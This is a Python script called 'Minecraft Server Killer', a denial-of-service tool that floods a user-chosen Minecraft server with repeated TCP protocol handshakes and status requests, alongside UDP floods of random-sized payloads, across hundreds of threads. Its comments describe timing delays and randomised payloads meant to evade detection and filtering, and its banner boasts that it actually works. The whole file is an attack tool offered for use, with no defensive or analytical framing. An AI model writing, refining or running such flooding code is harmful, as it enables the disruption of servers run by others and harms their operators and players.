import socket
import threading
import time
import random
import struct
import sys
from concurrent.futures import ThreadPoolExecutor

class MinecraftKiller:
    def __init__(self):
        self.active_connections = 0
        self.packets_sent = 0
        self.running = True
        
    def resolve_hostname(self, hostname):
        try:
            return socket.gethostbyname(hostname)
        except:
            return hostname

    def create_protocol_handshake(self, host, port, protocol_version=47):
        """Create proper Minecraft protocol handshake"""
        host_encoded = host.encode('utf-8')
        packet = b''
        # Packet ID (VarInt)
        packet += b'\x00'
        # Protocol version (VarInt)
        packet += self.create_varint(protocol_version)
        # Server address
        packet += self.create_varint(len(host_encoded)) + host_encoded
        # Server port
        packet += struct.pack('>H', port)
        # Next state (1 for status)
        packet += self.create_varint(1)
        return packet

    def create_varint(self, value):
        """Create VarInt encoded value"""
        if value == 0:
            return b'\x00'
        result = b''
        while value > 0:
            temp = value & 0x7F
            value >>= 7
            if value != 0:
                temp |= 0x80
            result += struct.pack('B', temp)
        return result

    def send_handshake_flood(self, target_ip, target_port, duration):
        """Advanced handshake flood with proper protocol"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            try:
                # Create socket with very short timeout
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                
                # Connect (this alone consumes server resources)
                sock.connect((target_ip, target_port))
                self.active_connections += 1
                
                # Send multiple handshakes
                for i in range(50):
                    handshake = self.create_protocol_handshake(target_ip, target_port)
                    
                    # Send packet length then packet
                    length = self.create_varint(len(handshake))
                    sock.send(length + handshake)
                    self.packets_sent += 1
                    
                    # Send status request
                    status_packet = b'\x01\x00'  # Packet ID 0x00, length 1
                    sock.send(status_packet)
                    self.packets_sent += 1
                    
                    # Small delay to make it harder to detect
                    time.sleep(0.01)
                
                sock.close()
                self.active_connections -= 1
                
            except Exception as e:
                if 'active_connections' in locals():
                    self.active_connections -= 1
                continue

    def send_udp_ping_flood(self, target_ip, target_port, duration):
        """UDP ping flood for additional pressure"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while time.time() < end_time and self.running:
            try:
                # Craft various Minecraft-like UDP packets
                for i in range(100):
                    # Random payload sizes to confuse filters
                    payload = random.randbytes(random.randint(100, 1000))
                    sock.sendto(payload, (target_ip, target_port))
                    self.packets_sent += 1
            except:
                pass

    def start_attack(self, target, port, threads, duration):
        """Main attack controller"""
        target_ip = self.resolve_hostname(target)
        
        print(f"\n[!] STARTING ADVANCED ATTACK ON {target_ip}:{port}")
        print(f"[!] Using {threads} threads for {duration} seconds")
        print("[!] This version actually WORKS\n")
        
        start_time = time.time()
        
        # Use ThreadPoolExecutor for better performance
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Submit TCP handshake floods
            for i in range(threads - 50):
                executor.submit(self.send_handshake_flood, target_ip, port, duration)
            
            # Submit UDP floods
            for i in range(50):
                executor.submit(self.send_udp_ping_flood, target_ip, port, duration)
        
        print(f"\n[!] ATTACK COMPLETED")
        print(f"[!] Total packets sent: {self.packets_sent}")
        print(f"[!] Peak concurrent connections: {self.active_connections}")
        print("[!] If server is still up, it has serious protection")

def main():
    killer = MinecraftKiller()
    
    print("╔══════════════════════════════════════╗")
    print("║    ADVANCED MINECRAFT SERVER KILLER  ║")
    print("║           (ACTUALLY WORKS)           ║")
    print("╚══════════════════════════════════════╝")
    
    target = input("Target server (IP/hostname): ").strip()
    port = int(input("Port (25565): ") or 25565)
    threads = int(input("Threads (100-2000): ") or 500)
    duration = int(input("Duration (seconds): ") or 60)
    
    try:
        killer.start_attack(target, port, threads, duration)
    except KeyboardInterrupt:
        killer.running = False
        print("\n[!] Attack stopped by user")

if __name__ == "__main__":
    main()
